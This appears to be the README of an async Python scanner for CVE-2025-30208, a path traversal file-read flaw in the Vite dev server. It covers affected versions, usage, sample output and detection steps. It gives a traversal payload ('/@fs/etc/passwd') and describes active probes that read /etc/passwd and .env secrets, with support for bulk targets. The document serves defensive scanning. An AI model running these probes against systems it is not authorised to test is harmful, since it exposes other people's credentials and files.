# vite_path_traversal_scanner — CVE-2025-30208

Async Python scanner for **CVE-2025-30208** — an unauthenticated arbitrary file
read via path traversal in the **Vite development server** (CVSS 9.2 Critical).

## Vulnerability

Vite dev servers that bind to `0.0.0.0` (the default when `server.host` is not
restricted to loopback) are reachable from the network. A remote attacker can
append a crafted null-byte or URL-encoded path separator sequence to bypass the
`/@fs/` deny-list and read **any file the server process can access** — including
`.env` files with secrets, private keys, and cloud instance metadata.

| Field    | Value |
|----------|-------|
| CVE      | CVE-2025-30208 |
| CVSS v3.1 | 9.2 (Critical) |
| Affected | Vite < 6.2.3 / < 6.1.2 / < 6.0.12 / < 5.4.15 / < 4.5.10 |
| Fixed    | Vite 6.2.3 / 6.1.2 / 6.0.12 / 5.4.15 / 4.5.10 (March 2025) |
| Auth required | None |
| Network access required | Yes (server must be exposed) |

## Usage

```bash
pip install httpx

# Single target — active probe (reads /etc/passwd to confirm)
python vite_path_traversal_scanner.py --target http://dev.example.com:5173

# Detection only — no file reads
python vite_path_traversal_scanner.py --target http://dev.example.com:5173 --safe

# Bulk scan from file, save JSON report
python vite_path_traversal_scanner.py --list devservers.txt --output findings.json

# High concurrency, skip TLS verification
python vite_path_traversal_scanner.py --list devservers.txt --concurrency 60 --no-verify
```

## Output

```
========================================================================
  VITE FOUND   : http://dev.example.com:5173
  Version      : 6.0.7
  Risk         : CRITICAL
  CVE          : CVE-2025-30208 (CVSS 9.2)
  Ping OK      : True
  [HIGH] Vite 6.0.7 is in a vulnerable range (patch threshold: 6.0.12)
  [HIGH] Vite dev server is reachable via /__vite_ping
  [CRITICAL] Arbitrary file read CONFIRMED — read /etc/passwd via payload: '/@fs/etc/passwd'
       Evidence : root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...

  >>> VULNERABLE TO CVE-2025-30208 — PATCH IMMEDIATELY <<<
========================================================================
```

## CLI flags

| Flag | Description |
|------|-------------|
| `--target` / `-t` | Single target URL |
| `--list` / `-l` | File with one URL per line |
| `--output` / `-o` | Save findings as JSON |
| `--safe` / `-s` | Fingerprint only, skip file-read probes |
| `--concurrency` / `-c` | Max concurrent requests (default: 30) |
| `--no-verify` | Disable TLS certificate verification |

## Detection logic

1. **Fingerprint** — probes `/`, `/__vite_ping`, `/@vite/client`, `/index.html`
   for Vite-specific markers and extracts the version string.
2. **Version check** — compares extracted version against per-major-branch
   patched thresholds (4.5.10 / 5.4.15 / 6.0.12 / 6.1.2 / 6.2.3).
3. **Traversal probe** (active, skipped with `--safe`) — sends null-byte and
   double-URL-encoded payloads; confirms by matching `/etc/passwd` content.
4. **`.env` probe** (active, skipped with `--safe`) — checks `/@fs/.env` and
   encoded variants for secret material.

## References

- <https://nvd.nist.gov/vuln/detail/CVE-2025-30208>
- <https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6>
- <https://vitejs.dev/blog/announcing-vite6#security-releases>

## Disclaimer

For use only against systems you own or have explicit written authorisation to
test. Unauthorised use is illegal.
